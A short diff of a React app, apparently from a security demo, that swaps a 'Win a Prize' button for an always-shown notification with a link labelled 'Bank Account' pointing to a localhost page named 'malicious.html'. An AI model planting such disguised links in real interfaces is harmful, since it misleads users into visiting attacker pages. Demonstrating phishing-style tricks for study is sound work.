@@ -15,9 +15,8 @@ function App() {
               <Link to="/profile">Bank Account</Link>
             </li>
             <div>
-              <button onClick={handleWinPrize}>Win a Prize</button>
-              <div className={`notification ${showNotification ? 'show' : ''}`}>
-                Congratulations! You've won a prize!
+              <div className={'notification show'}>
+                <Link to="http://localhost:3002/malicious.html">Bank Account</Link>
               </div>
             </div>
           </ul>
